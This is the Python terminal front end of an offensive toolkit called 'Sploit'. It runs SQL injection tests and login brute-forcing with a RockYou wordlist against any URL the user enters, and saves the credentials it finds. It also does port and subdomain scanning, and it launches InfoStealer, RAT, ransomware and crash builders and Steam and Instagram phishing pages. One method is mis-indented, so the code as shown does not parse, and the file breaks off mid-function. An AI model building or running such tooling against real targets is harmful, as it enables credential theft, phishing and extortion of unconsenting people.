import os
import sys
import requests
import subprocess
import urllib3
import argparse
from datetime import datetime
from Web.Basic_SQL.form_finder import find_forms
from Web.Basic_SQL.form_tester import test_form, load_sql_errors
from Web.Gain_information.Builder import SiteScanner, pretty_print
from Web.Header_Analyzer.Builder import HeaderAnalyzerBuilder
from Web.SSL_Chekcer.Builder import SSLCheckerBuilder
from Web.DNS_Enumeration.Builder import DNSEnumerationBuilder
import Web.Find_Login_Pages.Builder as BuilderModule
from Web.Firewall_Detector.firewall_detector import FirewallDetector
from Phishing_AI.Test import TestChatBot as PhishingChatBot
import joblib
import pandas as pd
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.metrics.pairwise import cosine_similarity
import re
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))


class SploitTerminal:
    def __init__(self):
        self.running = True
        self.current_module = None
        self.stop_flag = {"stop": False}

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def print_banner(self):
        banner = """
        ███████╗██████╗ ██╗      ██████╗ ██╗████████╗
        ██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
        ███████╗██████╔╝██║     ██║   ██║██║   ██║   
        ╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   
        ███████║██║     ███████╗╚██████╔╝██║   ██║   
        ╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   

        🔐 SPLOIT PENETRATION TOOLKIT - TERMINAL MODE
        """
        print(banner)
        print("🌐 Comprehensive Security Testing Suite")
        print("=" * 60)

        time.sleep(3.5)

    def print_menu(self):
        print("\n📋 MAIN MENU:")
        print("=" * 40)
        print("🌐 Web Application Testing:")
        print("  1. Web Security Test (SQLi)")
        print("  2. Subdirectory Finder")
        print("  3. Full Site Scan")
        print("  4. Brute Force Simulator")
        print("  5. Admin Finder")
        print("  6. Deep Site Scanner")

        print("\n🔧 Network & Infrastructure:")
        print("  7. Port Scanner")
        print("  8. Header Analyzer")
        print("  9. SSL/TLS Checker")
        print("  10. DNS Enumeration")
        print("  11. Firewall Detector")
        print("  12. Subdomain Enumeration")

        print("\n💻 Penetration Windows Toolkits:")
        print("  13. InfoStealer (Trojan)")
        print("  14. RDP Sec (RAT) - CLI Only")
        print("  15. RansomApp (Encryption)")
        print("  16. PhishCapture (Fake Pages)")
        print("  17. PhishCreator (AI)")
        print("  18. SystemTroll (Crash)")

        print("\n⚙️ Additional Tools:")
        print("  19. Sploit ChatBot")
        print("  20. Settings")
        print("  21. About")
        print("  22. Run GUI")
        print("  0. Exit")
        print("=" * 40)

    def get_user_choice(self):
        try:
            choice = input("\n🎯 Enter your choice (0-21): ").strip()
            return int(choice)
        except ValueError:
            print("❌ Invalid input. Please enter a number.")
            return -1

    def run_module(self, choice):
        self.stop_flag["stop"] = False
        self.current_module = choice

        if choice == 0:
            self.running = False
            print("👋 Exiting Sploit Toolkit. Goodbye!")
            return

        elif choice == 1:
            self.web_security_test()
        elif choice == 2:
            self.subdirectory_finder()
        elif choice == 3:
            self.full_site_scan()
        elif choice == 4:
            self.brute_force_simulator()
        elif choice == 5:
            self.admin_finder()
        elif choice == 6:
            self.deep_site_scanner()
        elif choice == 7:
            self.port_scanner()
        elif choice == 8:
            self.header_analyzer()
        elif choice == 9:
            self.ssl_checker()
        elif choice == 10:
            self.dns_enumeration()
        elif choice == 11:
            self.firewall_detector()
        elif choice == 12:
            self.subdomain_enumeration()
        elif choice == 13:
            self.infostealer_builder()
        elif choice == 14:
            self.rdp_sec_info()
        elif choice == 15:
            self.ransomapp_builder()
        elif choice == 16:
            self.phishcapture()
        elif choice == 17:
            self.phishcreator_ai()
        elif choice == 18:
            self.systemtroll_builder()
        elif choice == 19:
            self.sploit_chatbot()
        elif choice == 20:
            self.settings()
        elif choice == 21:
            self.about()
        elif choice == 22:
            self.Run_GUI()

        else:
            print("❌ Invalid choice. Please try again.")

    def prompt_for_input(self, prompt, default=""):
        if default:
            user_input = input(f"{prompt} [{default}]: ").strip()
            return user_input if user_input else default
        else:
            return input(f"{prompt}: ").strip()

    def web_security_test(self):
        print("\n🔍 Web Security Test (SQL Injection)")
        print("=" * 50)

        url = self.prompt_for_input("Enter target URL")
        if not url:
            print("❌ URL is required.")
            return

        print(f"[+] Starting SQL injection test on: {url}")

        try:
            payload_file = os.path.join("Web","Basic_SQL","Payloads.txt")
            sql_errors_file = os.path.join("Web","Basic_SQL","sql_errors.txt")

            with open(payload_file, "r", encoding="utf-8") as f:
                payloads = [line.strip() for line in f if line.strip()]

            sql_errors = load_sql_errors(sql_errors_file)

            print(f"[+] Loaded {len(payloads)} payload(s)")
            print(f"[+] Loaded {len(sql_errors)} SQL error patterns")

            forms = find_forms(url, debug=False)
            print(f"[+] Found {len(forms)} form(s)")

            vulnerabilities_found = 0
            for form in forms:
                for payload in payloads:
                    if self.stop_flag["stop"]:
                        print("[!] Test stopped by user")
                        return

                    found, error = test_form(form, payload, sql_errors, debug=False)
                    if found:
                        print(f"[!!!] VULNERABLE: Form #{form['form_number']} at {form['action']}")
                        print(f"     Payload: {payload}")
                        print(f"     Error: {error}")
                        vulnerabilities_found += 1
                    else:
                        print(f"[*] No SQLi detected with payload: {payload}")

            if vulnerabilities_found > 0:
                print(f"\n✅ Found {vulnerabilities_found} vulnerabilities!")
            else:
                print("\n✅ No vulnerabilities found.")

        except Exception as e:
            print(f"❌ Error: {str(e)}")

    def subdirectory_finder(self):
        print("\n📁 Subdirectory Finder")
        print("=" * 50)

        base_url = self.prompt_for_input("Enter base URL")
        if not base_url:
            print("❌ URL is required.")
            return

        wordlist_file = os.path.join("Web","Subdirectory_Finder", "Hidden_urls.txt")
        output_file_path = os.path.join("Web","Subdirectory_Finder", "Found_Success.txt")

        try:
            with open(wordlist_file, "r", encoding="utf-8", errors="ignore") as f:
                paths = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"❌ Failed to load wordlist: {e}")
            return

        print(f"[+] Starting subdirectory scan on: {base_url}")
        print(f"[+] Using wordlist with {len(paths)} entries")

        found_count = 0
        try:
            with open(output_file_path, "w", encoding="utf-8") as output_file:
                for i, path in enumerate(paths):
                    if self.stop_flag["stop"]:
                        print("[!] Scan stopped by user")
                        return

                    final_url = base_url + path
                    try:
                        response = requests.get(final_url, timeout=5)
                        if response.status_code == 200:
                            print(f"[+ ✅] Found: {final_url}")
                            output_file.write(final_url + "\n")
                            found_count += 1
                        else:
                            print(f"[-] {final_url} - Status {response.status_code}")
                    except Exception as req_err:
                        print(f"[-] Error fetching {final_url} => {req_err}")

                    if (i + 1) % 100 == 0:
                        progress = (i + 1) / len(paths) * 100
                        print(f"[*] Progress: {progress:.1f}% ({i + 1}/{len(paths)})")

            print(f"\n✅ Scan completed! Found {found_count} subdirectories.")
            print(f"[+] Results saved to: {output_file_path}")

        except Exception as e:
            print(f"❌ Error: {str(e)}")

    def full_site_scan(self):
        print("\n🌐 Full Site Scanner")
        print("=" * 50)

        url = self.prompt_for_input("Enter target URL")
        if not url:
            print("❌ URL is required.")
            return

        print(f"[+] Starting full site scan on: {url}")

        try:
            scanner = SiteScanner(url)
            results = scanner.run_all()

            print("\n" + "=" * 60)
            print("        🌐 FULL SITE SCAN RESULTS 🌐")
            print("=" * 60)

            for section, data in results.items():
                if self.stop_flag["stop"]:
                    print("[!] Scan stopped by user")
                    return

                print(f"\n--- {section.upper()} ---")
                pretty_print(data)

            print("\n" + "=" * 60)

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = f"site_scan_results_{timestamp}.txt"

            with open(output_file, "w", encoding="utf-8") as f:
                f.write("=" * 60 + "\n")
                f.write("        🌐 FULL SITE SCAN RESULTS 🌐\n")
                f.write("=" * 60 + "\n")

                for section, data in results.items():
                    f.write(f"\n--- {section.upper()} ---\n")
                    pretty_print(data, file=f)

                f.write("\n" + "=" * 60 + "\n")

            print(f"[+] Results saved to: {output_file}")

        except Exception as e:
            print(f"❌ Error: {str(e)}")

    def brute_force_simulator(self):
        print("\n🔑 Brute Force Simulator")
        print("=" * 50)

        url = self.prompt_for_input("Enter login URL")
        if not url:
            print("❌ URL is required.")
            return

        print(f"[+] Starting brute force simulation on: {url}")

        try:
            from Web.Brute_Force.Action import attempt_login, check_success
            from Web.Brute_Force.Elements import extract_form_fields
            import requests
            import time
            import os

            base_dir = os.path.dirname(os.path.abspath(__file__))

            usernames_file = os.path.join(base_dir, "Web", "Brute_Force", "Usernames.txt")
            passwords_file = os.path.join(base_dir, "Web", "Brute_Force", "RockYou.txt")

            if not os.path.exists(usernames_file):
                print(f"❌ Usernames file not found: {usernames_file}")
                return

            if not os.path.exists(passwords_file):
                print(f"❌ Passwords file not found: {passwords_file}")
                return

            print("[+] Loading usernames...")
            with open(usernames_file, "r", encoding="utf-8", errors="ignore") as f:
                usernames = [line.strip() for line in f if line.strip()]

            print("[+] Loading passwords...")
            with open(passwords_file, "r", encoding="utf-8", errors="ignore") as f:
                passwords = [line.strip() for line in f if line.strip()]
            print("[+] You can Set your Username list and Password in Brute_Force Directory Default is RockYou.txt "
                  "for Password and Usernames.txt for username .")
            time.sleep(5)
            print(f"[+] Loaded {len(usernames)} usernames")
            print(f"[+] Loaded {len(passwords)} passwords")

            print("[+] Extracting form fields...")
            form_data = extract_form_fields(url)
            print("[+] Form extracted successfully")

            session = requests.Session()
            credentials_found = False

            max_usernames = min(10, len(usernames))
            max_passwords = min(20, len(passwords))

            print(f"🧪 Testing with {max_usernames} usernames and {max_passwords} passwords each")

            for i, user in enumerate(usernames[:max_usernames]):
                if self.stop_flag["stop"]:
                    print("[!] Brute force stopped by user")
                    return

                for j, pwd in enumerate(passwords[:max_passwords]):
                    if self.stop_flag["stop"]:
                        print("[!] Brute force stopped by user")
                        return

                    print(f"[*] Trying {user}:{pwd} ({i + 1}/{max_usernames}, {j + 1}/{max_passwords})")

                    try:
                        response = attempt_login(session, form_data, user, pwd)
                        if check_success(response, form_data):
                            print(f"\n✅ LOGIN SUCCESSFUL: {user}:{pwd}")
                            credentials_found = True
                            self.save_credentials(url, user, pwd)
                            break
                        else:
                            print("   ❌ Login failed")
                    except Exception as e:
                        print(f"   ⚠️ Error: {e}")

                    time.sleep(0.1)

                if credentials_found:
                    break

            if not credentials_found:
                print("\n❌ No valid credentials found.")

            if not credentials_found and (max_usernames < len(usernames) or max_passwords < len(passwords)):
                choice = input("\nContinue with full scan? (y/n): ").lower().strip()
                if choice == 'y':
                    print("🚀 Starting full brute force scan...")

        except Exception as e:
            print(f"❌ Failed to run brute force: {str(e)}")
            import traceback
            traceback.print_exc()

    def save_credentials(self, url, username, password):
        try:
            import os
            from datetime import datetime

            base_dir = os.path.dirname(os.path.abspath(__file__))
            results_dir = os.path.join(base_dir, "Brute_Force_Results")
            os.makedirs(results_dir, exist_ok=True)

            filename = os.path.join(results_dir, f"found_credentials_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")

            with open(filename, "w", encoding="utf-8") as f:
                f.write("🔐 Brute Force Results\n")
                f.write("=" * 50 + "\n")
                f.write(f"URL: {url}\n")
                f.write(f"Username: {username}\n")
                f.write(f"Password: {password}\n")
                f.write(f"Found at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 50 + "\n")

            print(f"💾 Credentials saved to: {filename}")

        except Exception as e:
            print(f"⚠️ Could not save credentials: {e}")




    def admin_finder(self):
        print("\n👤 Admin Finder")
        print("=" * 50)

        url = self.prompt_for_input("Enter target URL")
        if not url:
            print("❌ URL is required.")
            return

        print(f"[+] Starting admin page search on: {url}")

        try:
            BuilderModule.Find_Admin(stop_flag=self.stop_flag, base_url=url)
            print("\n✅ Admin page search completed.")
        except Exception as e:
            print(f"❌ Error: {str(e)}")

    def deep_site_scanner(self):
        print("\n🕵️ Deep Site Scanner")
        print("=" * 50)

        url = self.prompt_for_input("Enter target URL")
        if not url:
            print("❌ URL is required.")
            return

        print(f"[+] Starting deep site scan on: {url}")

        try:
            scanner = SiteScanner(url)
            results = scanner.run_all()

            print("\n" + "=" * 60)
            print("        🕵️ DEEP SITE SCAN RESULTS 🕵️")
            print("=" * 60)

            for section, data in results.items():
                if self.stop_flag["stop"]:
                    print("[!] Scan stopped by user")
                    return

                print(f"\n--- {section.upper()} ---")
                pretty_print(data)

            print("\n" + "=" * 60)

            # ذخیره نتایج
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = f"deep_scan_results_{timestamp}.txt"

            with open(output_file, "w", encoding="utf-8") as f:
                f.write("=" * 60 + "\n")
                f.write("        🕵️ DEEP SITE SCAN RESULTS 🕵️\n")
                f.write("=" * 60 + "\n")

                for section, data in results.items():
                    f.write(f"\n--- {section.upper()} ---\n")
                    pretty_print(data, file=f)

                f.write("\n" + "=" * 60 + "\n")

            print(f"[+] Results saved to: {output_file}")

        except Exception as e:
            print(f"❌ Error: {str(e)}")


    def port_scanner(self):
        print("\n🔍 Port Scanner")
        print("=" * 50)

        target = self.prompt_for_input("Enter target host or IP")
        if not target:
            print("❌ Target is required.")
            return

        print("\n📊 Scan Options:")
        print("1. Quick Scan (top 100 ports)")
        print("2. Common Services (top 1000 ports)")
        print("3. Full Scan (all 65535 ports)")
        print("4. Custom Range")

        choice = self.prompt_for_input("Select scan type (1-4)", "1")

        top_100_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995,
                         1723, 3306, 3389, 5900, 8080, 8443, 1, 2, 3, 7, 9, 13, 17, 19, 20, 26,
                         37, 53, 79, 81, 88, 106, 110, 111, 113, 119, 135, 139, 143, 144, 179,
                         199, 389, 427, 443, 444, 445, 465, 513, 514, 515, 543, 544, 548, 554,
                         587, 631, 646, 873, 990, 993, 995, 1025, 1026, 1027, 1028, 1029, 1110,
                         1433, 1720, 1723, 1755, 1900, 2000, 2001, 2049, 2121, 2717, 3000, 3128,
                         3306, 3389, 3986, 4899, 5000, 5009, 5051, 5060, 5101, 5190, 5357, 5432,
                         5631, 5666, 5800, 5900, 6000, 6001, 6646, 7070, 8000, 8008, 8009, 8080,
                         8081, 8443, 8888, 9100, 9999, 10000, 32768, 32771]

        if choice == "1":
            ports = top_100_ports
            print(f"[+] Scanning top {len(ports)} ports...")
        elif choice == "2":
            ports = list(range(1, 1001))
            print("[+] Scanning common ports (1-1000)...")
        elif choice == "3":
            ports = list(range(1, 65536))
            print("[+] Scanning all ports (1-65535)...")
        elif choice == "4":
            custom_range = self.prompt_for_input("Enter port range (e.g., 20-80) or list (e.g., 80,443,8080)")
            if "-" in custom_range:
                start, end = map(int, custom_range.split("-"))
                ports = list(range(start, end + 1))
            elif "," in custom_range:
                ports = [int(p.strip()) for p in custom_range.split(",")]
            else:
                ports = [int(custom_range)]
            print(f"[+] Scanning {len(ports)} custom ports...")
        else:
            print("❌ Invalid choice. Using quick scan.")
            ports = top_100_ports

        max_threads = self.prompt_for_input("Enter number of threads (default: 50)", "50")
        try:
            max_threads = int(max_threads)
        except:
            max_threads = 50
            print("⚠️  Using default 50 threads")

        print(f"[+] Starting scan on {target} with {max_threads} threads...")

        import socket
        import concurrent.futures
        from datetime import datetime

        start_time = datetime.now()
        open_ports = []

        def check_port(port):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(1)
                    result = s.connect_ex((target, port))
                    if result == 0:
                        return port, True
                    return port, False
            except:
                return port, False

        with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
            future_to_port = {executor.submit(check_port, port): port for port in ports}

            for i, future in enumerate(concurrent.futures.as_completed(future_to_port)):
                port, is_open = future.result()
                if is_open:
                    open_ports.append(port)
                    print(f"✅ Port {port} - OPEN")

                # نمایش پیشرفت
                if (i + 1) % 100 == 0 or (i + 1) == len(ports):
                    progress = (i + 1) / len(ports) * 100
                    print(f"📊 Progress: {progress:.1f}% ({i + 1}/{len(ports)})")

        end_time = datetime.now()
        scan_duration = (end_time - start_time).total_seconds()

        print(f"\n🎉 Scan completed in {scan_duration:.2f} seconds!")
        print(f"✅ Found {len(open_ports)} open ports:")

        if open_ports:
            port_services = {
                21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS", 80: "HTTP",
                110: "POP3", 111: "RPC", 135: "RPC", 139: "NetBIOS", 143: "IMAP",
                443: "HTTPS", 445: "SMB", 993: "IMAPS", 995: "POP3S", 1723: "PPTP",
                3306: "MySQL", 3389: "RDP", 5900: "VNC", 8080: "HTTP-Alt", 8443: "HTTPS-Alt"
            }

            for port in sorted(open_ports):
                service = port_services.get(port, "Unknown")
                print(f"   📍 Port {port} - {service}")

            save_results = self.prompt_for_input("Save results to file? (y/n)", "y").lower()
            if save_results == 'y':
                filename = f"port_scan_{target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                with open(filename, 'w') as f:
                    f.write(f"Port Scan Results for {target}\n")
                    f.write(f"Scan completed: {end_time}\n")
                    f.write(f"Duration: {scan_duration:.2f} seconds\n")
                    f.write(f"Open ports: {len(open_ports)}\n\n")
                    for port in sorted(open_ports):
                        service = port_services.get(port, "Unknown")
                        f.write(f"Port {port} - {service}\n")
                print(f"💾 Results saved to {filename}")
        else:
            print("❌ No open ports found.")

        if open_ports:
            deep_scan = self.prompt_for_input("Perform service detection on open ports? (y/n)", "n").lower()
            if deep_scan == 'y':
                print("\n🔍 Performing service detection...")
                self.service_detection(target, open_ports)


    def service_detection(self, target, ports):
        import socket

        banner_messages = {
            21: b"", 22: b"", 80: b"GET / HTTP/1.0\r\n\r\n", 443: b"",
            25: b"EHLO example.com\r\n", 110: b"", 143: b""
        }

        for port in ports:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(2)
                    s.connect((target, port))

                    if port in banner_messages:
                        s.send(banner_messages[port])

                    banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
                    if banner:
                        print(f"   🖥️  Port {port} Banner: {banner[:100]}{'...' if len(banner) > 100 else ''}")

            except Exception as e:
                print(f"   ⚠️  Port {port}: Could not retrieve banner - {str(e)}")



    def header_analyzer(self):
        print("\n📋 Header Analyzer")
        print("=" * 50)

        url = self.prompt_for_input("Enter website URL")
        if not url:
            print("❌ URL is required.")
            return

        print(f"[+] Analyzing headers for: {url}")

        try:
            builder = HeaderAnalyzerBuilder(url)
            results = builder.run()

            if not results:
                print("❌ No results returned")
                return

            if 'error' in results:
                print(f"❌ {results['error']}")
                return

            status_code = results.get('status_code', 'Unknown')
            server_info = results.get('server_info', 'Unknown')
            powered_by = results.get('powered_by', 'Unknown')

            print(f"[+] Status Code: {status_code}")
            print(f"[+] Server: {server_info}")
            print(f"[+] Powered By: {powered_by}")
            print("\n[+] Security Headers Analysis:")

            security_analysis = results.get('security_analysis', {})
            for header, info in security_analysis.items():
                status = "✅" if info.get('present') else "❌"
                value = info.get('value') or 'Missing'
                print(f"  {status} {header}: {value}")

        except Exception as e:
            print(f"❌ Error: {str(e)}")

    def ssl_checker(self):
        print("\n🔒 SSL/TLS Checker")
        print("=" * 50)

        hostname = self.prompt_for_input("Enter website hostname")
        if not hostname:
            print("❌ Hostname is required.")
            return

        print(f"[+] Checking SSL/TLS for: {hostname}")

        try:
            builder = SSLCheckerBuilder(hostname)
            results = builder.run()

            if not results:
                print("❌ No results returned")
                return

            ssl_version = results.get('ssl_version', 'None')
            print(f"[+] SSL Version: {ssl_version}")

            cipher = results.get('cipher')
            cipher_text = cipher[0] if cipher else 'None'
            print(f"[+] Cipher: {cipher_text}")

            valid = results.get('valid', False)
            print(f"[+] Certificate Valid: {valid}")

            if valid and results.get('certificate'):
                cert = results['certificate']
                print(f"[+] Issuer: {cert.get('issuer', 'Unknown')}")
                print(f"[+] Valid From: {cert.get('valid_from', 'Unknown')}")
                print(f"[+] Valid To: {cert.get('valid_to', 'Unknown')}")
                print(f"[+] Days Until Expiry: {cert.get('days_until_expiry', 'Unknown')}")
            elif not valid and results.get('error'):
                print(f"❌ Error: {results['error']}")

        except Exception as e:
            print(f"❌ Error: {str(e)}")

    def dns_enumeration(self):
        print("\n🌍 DNS Enumeration")
        print("=" * 50)

        domain = self.prompt_for_input("Enter domain")
        if not domain:
            print("❌ Domain is required.")
            return

        print(f"[+] Enumerating DNS for: {domain}")

        try:
            builder = DNSEnumerationBuilder(domain)
            results = builder.run()

            if not results:
                print("❌ No results returned")
                return

            if 'error' in results:
                print(f"❌ {results['error']}")
                return

            for record_type in ['a_records', 'aaaa_records', 'mx_records', 'ns_records', 'txt_records',
                                'cname_records', 'soa_record', 'ptr_records', 'srv_records']:
                value = results.get(record_type)
                if isinstance(value, list) or isinstance(value, dict):
                    value_text = ', '.join([str(v) for v in value]) if value else 'None'
                else:
                    value_text = str(value) if value else 'None'
                print(f"[+] {record_type.replace('_', ' ').upper()}: {value_text}")

        except Exception as e:
            print(f"❌ Error: {str(e)}")

    def firewall_detector(self):
        print("\n🛡️ Firewall Detector")
        print("=" * 50)

        target_ip = self.prompt_for_input("Enter target IP or URL", "127.0.0.1")
        if not target_ip:
            print("❌ Target is required.")
            return

        print(f"[+] Starting firewall detection for: {target_ip}")

        try:
            detector = FirewallDetector(target_ip)
            results = detector.scan()

            for k, v in results.items():
                print(f"{k:<10} : {v}")

            print(f"\n[+] Scan completed at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

            # ذخیره نتایج
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = f"firewall_results_{target_ip.replace(':', '_')}_{timestamp}.txt"

            with open(output_file, "w") as f:
                for k, v in results.items():
                    f.write(f"{k:<10} : {v}\n")

            print(f"[+] Results saved to: {output_file}")

        except Exception as e:
            print(f"❌ Error: {str(e)}")

    def subdomain_enumeration(self):
        print("\n🌐 Subdomain Enumeration")
        print("=" * 50)

        domain = self.prompt_for_input("Enter target domain")
        if not domain:
            print("❌ Domain is required.")
            return

        threads_input = self.prompt_for_input("Threads", "20")
        threads = int(threads_input) if threads_input.isdigit() else 20

        wordlist_path = os.path.join("Web","Advanced_Subdomain", "SubDomains.txt")

        try:
            with open(wordlist_path, "r", encoding="utf-8") as f:
                wordlist = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"❌ Failed to load wordlist: {e}")
            return

        print(f"[+] Starting subdomain enumeration for: {domain}")
        print(f"[+] Using {threads} threads")
        print(f"[+] Wordlist contains {len(wordlist)} subdomains")

        found = []
        total = len(wordlist)

        def check_sub(sub, index):
            urls = [f"http://{sub}.{domain}", f"https://{sub}.{domain}"]
            for url in urls:
                try:
                    r = requests.get(url, timeout=2)
                    if r.status_code < 400:
                        found.append(url)
                        print(f"[+ ✅] Found: {url}")
                        break
                except:
                    continue

            progress = int((index + 1) / total * 100)
            if (index + 1) % 100 == 0:
                print(f"[*] Progress: {progress}% | {index + 1}/{total} subdomains")

        try:
            from concurrent.futures import ThreadPoolExecutor, as_completed

            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = {executor.submit(check_sub, sub, i): sub for i, sub in enumerate(wordlist)}

                for future in as_completed(futures):
                    if self.stop_flag["stop"]:
                        print("[!] Enumeration stopped by user")
                        executor.shutdown(wait=False)
                        return

        except Exception as e:
            print(f"❌ Error: {str(e)}")

        print(f"\n✅ Enumeration completed! Found {len(found)} subdomains:")

        for sub in found:
            print(f"  {sub}")

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = f"subdomains_{domain}_{timestamp}.txt"

        with open(output_file, "w") as f:
            for sub in found:
                f.write(sub + "\n")

        print(f"[+] Results saved to: {output_file}")


    def open_directory(self, path):
        try:
            if os.path.exists(path):
                if os.name == 'nt':
                    os.startfile(path)
                    print(f"📂 Opened Windows Explorer: {path}")
                elif os.name == 'posix':
                    if sys.platform == 'darwin':
                        subprocess.run(['open', path])
                        print(f"📂 Opened Finder: {path}")
                    else:
                        subprocess.run(['xdg-open', path])
                        print(f"📂 Opened file manager: {path}")
                else:
                    print(f"📁 Directory path: {path}")
                    print("⚠️  Unsupported operating system. Please open the directory manually.")
            else:
                print("❌ Directory does not exist.")
        except Exception as e:
            print(f"❌ Error opening directory: {str(e)}")
            print(f"📁 You can manually navigate to: {path}")

    def launch_gui_application(self):
        try:
            base_dir = os.path.dirname(os.path.abspath(__file__))
            gui_path = os.path.join(base_dir, "GUI", "Application.py")

            if os.path.exists(gui_path):
                print("🚀 Launching GUI Application...")
                # تشخیص پلتفرم برای اجرای بهینه
                if os.name == 'nt':
                    os.system(f'python "{gui_path}"')
                else:
                    os.system(f'python3 "{gui_path}"')
            else:
                print("❌ GUI application not found. Please check the installation.")
                print(f"📁 Expected path: {gui_path}")

                gui_dir = os.path.dirname(gui_path)
                if os.path.exists(gui_dir):
                    choice = input("Open GUI directory? (y/n): ").lower().strip()
                    if choice == 'y':
                        self.open_directory(gui_dir)
        except Exception as e:
            print(f"❌ Error launching GUI: {str(e)}")

    def infostealer_builder(self):
        print("\n💀 InfoStealer Builder")
        print("=" * 50)
        print("This feature requires the GUI application.")
        print("Would you like to launch the GUI version?")

        choice = input("Launch GUI? (y/n): ").lower().strip()
        if choice == 'y':
            self.launch_gui_application()
        else:
            print("ℹ️ You can manually run the GUI from the GUI/Application.py directory")
            print(f"📟 Detected platform: {sys.platform} ({os.name})")

            open_dir = input("Open GUI directory? (y/n): ").lower().strip()
            if open_dir == 'y':
                base_dir = os.path.dirname(os.path.abspath(__file__))
                gui_dir = os.path.join(base_dir, "GUI")
                self.open_directory(gui_dir)

    def rdp_sec_info(self):
        print("\n🔒 RDP Security (RAT) Tool")
        print("=" * 50)
        print("This feature requires the GUI application.")
        print("Would you like to launch the GUI version?")

        choice = input("Launch GUI? (y/n): ").lower().strip()
        if choice == 'y':
            self.launch_gui_application()
        else:
            print("ℹ️ You can manually run the GUI from the GUI/Application.py directory")
            print(f"📟 Detected platform: {sys.platform} ({os.name})")

            open_dir = input("Open GUI directory? (y/n): ").lower().strip()
            if open_dir == 'y':
                base_dir = os.path.dirname(os.path.abspath(__file__))
                gui_dir = os.path.join(base_dir, "GUI")
                self.open_directory(gui_dir)


    def ransomapp_builder(self):
        print("\n💣 RansomApp Builder")
        print("=" * 50)
        print("This feature requires the GUI application.")
        print("Would you like to launch the GUI version?")

        choice = input("Launch GUI? (y/n): ").lower().strip()
        if choice == 'y':
            self.launch_gui_application()
        else:
            print("ℹ️ You can manually run the GUI from the GUI/Application.py directory")
            print(f"📟 Detected platform: {sys.platform} ({os.name})")

            open_dir = input("Open GUI directory? (y/n): ").lower().strip()
            if open_dir == 'y':
                base_dir = os.path.dirname(os.path.abspath(__file__))
                gui_dir = os.path.join(base_dir, "GUI")
                self.open_directory(gui_dir)

        def phishcapture(self):
        print("\n🎣 PhishCapture (Fake Pages)")
        print("=" * 50)

        while True:
            print("\n📋 Select Phishing Page Type:")
            print("1. Steam Phishing Page")
            print("2. Instagram Phishing Page")
            print("3. Picture Capture")
            print("4. Location Capture")
            print("5. Back to Main Menu")
            print("=" * 30)

            try:
                choice = int(input("🎯 Enter your choice (1-5): ").strip())

                if choice == 5:
                    print("↩️ Returning to main menu...")
                    break

                # تعیین نام فایل بر اساس انتخاب کاربر
                if choice == 1:
                    script_name = "steam.py"
                    page_name = "Steam"
                elif choice == 2:
                    script_name = "instagram.py"
                    page_name = "Instagram"
                elif choice == 3:
                    script_name = "take_picture.py"
                    page_name = "Picture Capture"
                elif choice == 4:
                    script_name = "location.py"
                    page_name = "Location Capture"
                else:
                    print("❌ Invalid choice! Please try again.")
                    continue

                base_dir = os.path.dirname(os.path.abspath(__file__))
                phishing_dir = os.path.join(base_dir, "Windows", "phishsploit")
                script_path = os.path.join(phishing_dir, script_name)

                if not os.path.exists(script_path):
                    print(f"❌ {page_name} phishing script not found!")
                    print(f"📁 Expected path: {script_path}")

                    if os.path.exists(phishing_dir):
                        print(f"\n📂 Contents of {phishing_dir}:")
                        for item in os.listdir(phishing_dir):
                            item_path = os.path.join(phishing_dir, item)
                            if os.path.isfile(item_path):
                                print(f"  📄 {item}")
                            else:
                                print(f"  📁 {item}/")
                    continue

                print(f"🚀 Launching {page_name} phishing page...")
                try:
                    original_dir = os.getcwd()
                    os.chdir(phishing_dir)

                    if os.name == 'nt':  # Windows
                        os.system(f'python "{script_name}"')
                    else:  # Linux/Mac
                        os.system(f'python3 "{script_name}"')

                    os.chdir(original_dir)

                    print(f"✅ {page_name} phishing page completed.")

                except Exception as e:
                    print(f"❌ Error launching {page_name}: {str(e)}")
                    import traceback
                    traceback.print_exc()

                input("\nPress Enter to continue...")

            except ValueError:
                print("❌ Please enter a valid number!")
            except KeyboardInterrupt:
                print("\n↩️ Returning to main menu...")
                break
            except Exception as e:
                print(f"❌ Unexpected error: {str(e)}")


    def phishcreator_ai(self):
        print("\n🤝 PhishCreator AI ChatBot")
        print("=" * 50)

        try:
            base_dir = os.path.dirname(os.path.abspath(__file__))
            model_path = os.path.join(base_dir, "Phishing_AI", "model.pkl")
            dataset_path = os.path.join(base_dir, "Phishing_AI", "phishing_dataset_clean.csv")

            print(f"🔍 Searching for model at: {model_path}")
            print(f"🔍 Searching for dataset at: {dataset_path}")

            if not os.path.exists(model_path):
                print(f"❌ Model file not found!")

                phishing_ai_dir = os.path.join(base_dir, "Phishing_AI")
                if os.path.exists(phishing_ai_dir):
                    print("📁 Contents of Phishing_AI directory:")
                    for item in os.listdir(phishing_ai_dir):
                        item_path = os.path.join(phishing_ai_dir, item)
                        if os.path.isfile(item_path):
                            print(f"  📄 {item}")
                        else:
                            print(f"  📁 {item}/")
                return

            if not os.path.exists(dataset_path):
                print(f"❌ Dataset file not found!")
                return

            print("✅ Files found! Loading...")

            import shutil
